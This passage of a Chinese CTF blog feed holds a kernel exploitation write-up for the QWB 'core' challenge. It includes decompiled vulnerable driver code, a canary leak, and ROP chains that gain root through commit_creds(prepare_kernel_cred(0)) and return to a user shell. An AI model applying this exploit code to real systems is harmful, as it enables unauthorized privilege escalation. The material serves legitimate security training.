punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span><span class=\"token number\">0x73311337</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0xfff</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    size_t write_ret <span class=\"token operator\">=</span> stack_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x88</span> <span class=\"token punctuation\">;</span>\n    size_t buffer<span class=\"token punctuation\">[</span><span class=\"token number\">0x1010</span><span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span>\n\n    buffer<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0x114514</span> <span class=\"token punctuation\">;</span>\n    buffer<span class=\"token punctuation\">[</span><span class=\"token number\">0x1000</span><span class=\"token operator\">/</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> write_ret <span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span>buffer <span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token comment\">//commit_creads(prepare_kernel_cred(0));</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rdi_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> prepare_kernel_cred<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> pop_rcx_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> mov_rdi_rax_y_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> commit_creds<span class=\"token punctuation\">;</span>\n\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> swapgs_popfq_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> iretq_ret<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>shell<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_cs<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_rflags<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_sp<span class=\"token punctuation\">;</span>\n    rop<span class=\"token punctuation\">[</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> user_ss<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span><span class=\"token number\">0x73311337</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0xfff</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span><span class=\"token number\">0x73311337</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0xfff</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// ioctl(fd ,0xDEADBEEF );</span>\n\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> rop <span class=\"token punctuation\">,</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n</code></pre>\n",
            "tags": [
                "kernel",
                "C语言"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/",
            "url": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/",
            "title": "教你学内核-qwb-core",
            "date_published": "2022-09-16T03:10:27.000Z",
            "content_html": "<blockquote>\n<p>这次绝对不鸽</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"qwb-core\"><a class=\"markdownIt-Anchor\" href=\"#qwb-core\">#</a> qwb-core</h1>\n<p>比较经典的一道入门题目，这边说一下做题的心路历程</p>\n<h2 id=\"信息搜集\"><a class=\"markdownIt-Anchor\" href=\"#信息搜集\">#</a> 信息搜集</h2>\n<p>首先解决的应该是查看题目的各种参数</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">qemu-system-x86_64 \\\n-m 256M \\\n-kernel .&#x2F;bzImage \\\n-initrd  .&#x2F;core.cpio \\\n-append &quot;root&#x3D;&#x2F;dev&#x2F;ram rw console&#x3D;ttyS0 oops&#x3D;panic panic&#x3D;1 quiet kaslr&quot; \\\n-s  \\\n-netdev user,id&#x3D;t0, -device e1000,netdev&#x3D;t0,id&#x3D;nic0 \\\n-nographic  \\</code></pre>\n<p>这里的 <a href=\"http://start.sh\">start.sh</a> 脚本开了 kaslr</p>\n<p>使用此选项后，每次系统启动时，内核代码在内存中的位置都是随机的，如果想要调用到内核上的代码段，我们可能需要泄露指针来计算当前内核的基地址</p>\n<p><a href=\"https://blog.wjhwjhn.com/archives/829/\">Linux Kernel 中的保护机制和攻击方法 - wjh’s blog (wjhwjhn.com)</a></p>\n<p>解包文件系统进行观察</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/image-20220916095831502.png\" alt=\"image-20220916095831502\"></p>\n<p>想必图中的 core.ko 就是我们需要调试的模块，接着查看 init 脚本</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">#!&#x2F;bin&#x2F;sh\nmount -t proc proc &#x2F;proc\nmount -t sysfs sysfs &#x2F;sys\nmount -t devtmpfs none &#x2F;dev\n&#x2F;sbin&#x2F;mdev -s\nmkdir -p &#x2F;dev&#x2F;pts\nmount -vt devpts -o gid&#x3D;4,mode&#x3D;620 none &#x2F;dev&#x2F;pts\nchmod 666 &#x2F;dev&#x2F;ptmx\ncat &#x2F;proc&#x2F;kallsyms &gt; &#x2F;tmp&#x2F;kallsyms\necho 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;kptr_restrict\necho 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;dmesg_restrict\nifconfig eth0 up\nudhcpc -i eth0\nifconfig eth0 10.0.2.15 netmask 255.255.255.0\nroute add default gw 10.0.2.2 \ninsmod &#x2F;core.ko\n\npoweroff -d 2000 -f &amp;\nsetsid &#x2F;bin&#x2F;cttyhack setuidgid 1000 &#x2F;bin&#x2F;sh\necho &#39;sh end!\\n&#39;\numount &#x2F;proc\numount &#x2F;sys\n\npoweroff -d 0  -f</code></pre>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">insmod &#x2F;core.ko</code></pre>\n<p>挂载模块</p>\n<p>其中有一行</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">cat &#x2F;proc&#x2F;kallsyms &gt; &#x2F;tmp&#x2F;kallsyms</code></pre>\n<p>kallsyms 包含内核中所有导出的符号表，这里记录了函数的真实地址，因此要绕过 kaslr ，可以通过读取 tmp 目录下的 kallsyms 来获得内核基地址等等，而 proc 目录下的 kallsyms 在非 root 状态下是读不了地址的</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/image-20220916100601763.png\" alt=\"image-20220916100601763\"></p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/image-20220916100638881.png\" alt=\"image-20220916100638881\"></p>\n<p>上图是分别读 proc 和 tmp 目录下 kallsyms 得到的结果，而导致这种情况的原因</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;kptr_restrict\necho 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;dmesg_restrict</code></pre>\n<p>禁止查看 kallsyms 和内核日志</p>\n<h2 id=\"发现漏洞\"><a class=\"markdownIt-Anchor\" href=\"#发现漏洞\">#</a> 发现漏洞</h2>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/image-20220916101926691.png\" alt=\"image-20220916101926691\"></p>\n<p>接着对 core.ko 模块进行分析，程序非常简单</p>\n<p>core_ioctl</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">__int64 __fastcall <span class=\"token function\">core_ioctl</span><span class=\"token punctuation\">(</span>__int64 fd<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> choice<span class=\"token punctuation\">,</span> __int64 arg<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> choice <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">case</span> <span class=\"token number\">0x6677889B</span><span class=\"token operator\">:</span>\n      <span class=\"token function\">core_read</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">case</span> <span class=\"token number\">0x6677889C</span><span class=\"token operator\">:</span>\n      <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>unk_2CD<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      offset <span class=\"token operator\">=</span> arg<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">case</span> <span class=\"token number\">0x6677889A</span><span class=\"token operator\">:</span>\n      <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>unk_2B3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">core_copy_func</span><span class=\"token punctuation\">(</span>arg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<blockquote>\n<p>通过第二个参数来控制流程，其中选项二就直接在外边了，可以自己设置一个全局变量 offset  的数值</p>\n</blockquote>\n<p>core_read</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">unsigned</span> __int64 __fastcall <span class=\"token function\">core_read</span><span class=\"token punctuation\">(</span>__int64 ptr<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span>\n  __int64 i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rcx</span>\n  <span class=\"token keyword\">unsigned</span> __int64 result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span>\n  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-50h] BYREF</span>\n  <span class=\"token keyword\">unsigned</span> __int64 v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+40h] [rbp-10h]</span>\n\n  v6 <span class=\"token operator\">=</span> <span class=\"token function\">__readgsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>unk_25B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>unk_275<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  v2 <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0x10LL</span><span class=\"token punctuation\">;</span> i<span class=\"token punctuation\">;</span> <span class=\"token operator\">--</span>i <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v2 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    v2 <span class=\"token operator\">+=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Welcome to the QWB CTF challenge.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  result <span class=\"token operator\">=</span> <span class=\"token function\">copy_to_user</span><span class=\"token punctuation\">(</span>ptr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>buf<span class=\"token punctuation\">[</span>offset<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>result <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">__readgsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v6<span class=\"token punctuation\">;</span>\n  __asm <span class=\"token punctuation\">&#123;</span> swapgs <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<blockquote>\n<p>这里使用了 copy_to_user 可以拷贝到用户传入的指针中，其中 buf 通过 offset 索引来拷贝内容到用户指针</p>\n</blockquote>\n<p>core_copy_func</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">__int64 __fastcall <span class=\"token function\">core_copy_func</span><span class=\"token punctuation\">(</span>__int64 size<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  __int64 result<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span>\n  _QWORD buf<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-50h] BYREF</span>\n\n  buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">__readgsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>unk_215<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> size <span class=\"token operator\">></span> <span class=\"token number\">0x3F</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>unk_2A1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span>\n  <span class=\"token punctuation\">&#123;</span>\n    result <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">qmemcpy</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>name<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int16<span class=\"token punctuation\">)</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> result<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<blockquote>\n<p>函数参数 size 为 int 类型，而 qmemcpy 的 size 转为了无符号数，那么可以实现溢出，从全局变量 name 中拷贝到栈上</p>\n</blockquote>\n<p>core_write</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\">__int64 __fastcall <span class=\"token function\">core_write</span><span class=\"token punctuation\">(</span>__int64 fd<span class=\"token punctuation\">,</span> __int64 buf<span class=\"token punctuation\">,</span> <span class=\"token keyword\">unsigned</span> __int64 size<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>unk_215<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> size <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x800</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">copy_from_user</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>name<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>size<span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printk</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>unk_230<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFF2LL</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<blockquote>\n<p>这里 write 也是直接将用户的数据拷贝到一个 name 全局变量</p>\n</blockquote>\n<p>上面就是所有会用到的函数</p>\n<p>综合上面的条件可以得到如下信息</p>\n<ol>\n<li>可以通过拷贝实现栈溢出</li>\n<li>offset 可控，可以通过栈上的 buf 泄露 canary</li>\n<li>可以通过读取 kallsyms 得到所需要的函数地址</li>\n</ol>\n<h2 id=\"调试方法\"><a class=\"markdownIt-Anchor\" href=\"#调试方法\">#</a> 调试方法</h2>\n<p>那么一个内核该如何调试呢，我们想要调试的是 core.ko，那么总需要先知道其基地址才能把断点下进去吧，通过请教教正涵师傅，得到了一个比较完整的调试流程</p>\n<p>先弄一个将 exp 编译和打包并运行的脚本</p>\n<p>boot.sh 启动脚本</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">gcc exp.c -static -o .&#x2F;fs&#x2F;exp\n# sudo chmod a+x c.sh\n# .&#x2F;c.sh\ncd fs\nfind . | cpio -o --format&#x3D;newc &gt; ..&#x2F;rootfs.cpio\ncd ..\n\nqemu-system-x86_64 \\\n-m 256M \\\n-kernel .&#x2F;bzImage \\\n-initrd  .&#x2F;rootfs.cpio \\\n-append &quot;root&#x3D;&#x2F;dev&#x2F;ram rw console&#x3D;ttyS0 oops&#x3D;panic panic&#x3D;1 quiet noaslr&quot; \\\n-s  \\\n-netdev user,id&#x3D;t0, -device e1000,netdev&#x3D;t0,id&#x3D;nic0 \\\n-nographic  \\</code></pre>\n<p>这里需要将 kaslr 关闭，之后，修改文件目录下的 init 脚本</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">#!&#x2F;bin&#x2F;sh\nmount -t proc proc &#x2F;proc\nmount -t sysfs sysfs &#x2F;sys\nmount -t devtmpfs none &#x2F;dev\n&#x2F;sbin&#x2F;mdev -s\nmkdir -p &#x2F;dev&#x2F;pts\nmount -vt devpts -o gid&#x3D;4,mode&#x3D;620 none &#x2F;dev&#x2F;pts\nchmod 666 &#x2F;dev&#x2F;ptmx\ncat &#x2F;proc&#x2F;kallsyms &gt; &#x2F;tmp&#x2F;kallsyms\necho 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;kptr_restrict\necho 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;dmesg_restrict\nifconfig eth0 up\nudhcpc -i eth0\nifconfig eth0 10.0.2.15 netmask 255.255.255.0\nroute add default gw 10.0.2.2 \ninsmod &#x2F;core.ko\n\npoweroff -d 2000 -f &amp;\nsetsid &#x2F;bin&#x2F;cttyhack setuidgid 0 &#x2F;bin&#x2F;sh\necho &#39;sh end!\\n&#39;\numount &#x2F;proc\numount &#x2F;sys\n\npoweroff -d 0  -f</code></pre>\n<p>这里修改了两个地方，poweroff 和 setuidgid 分别是自动关闭的时间和 获取内核的 root 权限，从而方便调试，因为如果想查看内核挂载 core.ko 的地址是需要 root 权限的</p>\n<p>通过运行脚本启动内核后，查看 core.ko 的地址</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/image-20220915171702762.png\" alt=\"image-20220915171702762\"></p>\n<p>随后在另一个终端开启 gdb 调试</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/image-20220915171803320.png\" alt=\"image-20220915171803320\"></p>\n<p>连上去后就可以直接下断点了</p>\n<p>也可以通过如下命令设置一下偏移，不过我直接下断点也没出现过问题，下好断点后 c 就可以继续执行</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">add-symbol-file core.ko  0xffffffffc030c000</code></pre>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-qwb-core/image-20220915174353383.png\" alt=\"image-20220915174353383\"></p>\n<p>随后回到那个终端，执行 exp 就可以达到断点位置</p>\n<h2 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<p>前面介绍了漏洞点和调试方法，接下来开始漏洞利用，首先是泄露 canary 地址</p>\n<p>通过 open 打开设备后，iotcl 按着条件来即可</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/core\"</span> <span class=\"token punctuation\">,</span> O_RDWR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span><span class=\"token number\">0x6677889c</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span><span class=\"token number\">0x6677889b</span> <span class=\"token punctuation\">,</span> buf <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ncanary <span class=\"token operator\">=</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>size_t <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"canary\"</span> <span class=\"token punctuation\">,</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre>\n<p>然后是重中之重的 rop 环节，内核的 rop 链构造需要首先保存现场，随后在 rop 结束后返回到用户态 恢复现场，而在 rop 的过程中需要执行一个嵌套调用  <code>commit_creds(prepare_kernel_cred(0)) </code></p>\n<p>那么我们至少需要如下 gadget，这些 gadget 可以在 vmlinux 里找到</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">pop rdi <span class=\"token punctuation\">;</span>ret<span class=\"token punctuation\">;</span>\nmov rdi <span class=\"token punctuation\">,</span>rax<span class=\"token punctuation\">;</span>ret<span class=\"token punctuation\">;</span></code></pre>\n<p>然而这里边没有第二个 gadget，但存在如下 gadget</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">mov rdi <span class=\"token punctuation\">,</span>rax<span class=\"token punctuation\">;</span>jmp rdx<span class=\"token punctuation\">;</span></code></pre>\n<p>因此还需要控制一下 rdx</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">pop rdx <span class=\"token punctuation\">;</span>ret<span class=\"token punctuation\">;</span></code></pre>\n<p>所以有如下 rop 链，先通过调用 prepare_kernel_cred 函数得到 rax ，之后控制 rdx 为 commit_creds 函数地址， 最后将 rax 给到 rdi 控制 commit_creds 参数最后调用之</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">pop_rdi_ret\n<span class=\"token number\">0</span>\nprepare_kernel_cred\npop_rdx_ret\ncommit_creds\nmov_rdi_rax_jmp_rdx</code></pre>\n<p>之后就是恢复现场的操作，因此至少需要如下 gadget</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">pop rdi <span class=\"token punctuation\">;</span>ret<span class=\"token punctuation\">;</span>\nmov rdi <span class=\"token punctuation\">,</span>rax<span class=\"token punctuation\">;</span>jmp rdx<span class=\"token punctuation\">;</span>\npop rdx <span class=\"token punctuation\">;</span>ret<span class=\"token punctuation\">;</span>\nswapgs<span class=\"token punctuation\">;</span> popfq<span class=\"token punctuation\">;</span> ret<span class=\"token punctuation\">;</span>\niretq<span class=\"token punctuation\">;</span> ret<span class=\"token punctuation\">;</span></code></pre>\n<p>个人比较习惯 python ，通过 python 找一下 gadget 和关键函数</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vmlinux'</span><span class=\"token punctuation\">)</span>\n\noffset <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff81000000</span>\n\ncommit_creds <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'commit_creds'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> offset\nprepare_kernel_cred <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'prepare_kernel_cred'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> offset\npop_rdi_ret <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">\"pop rdi;ret\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span 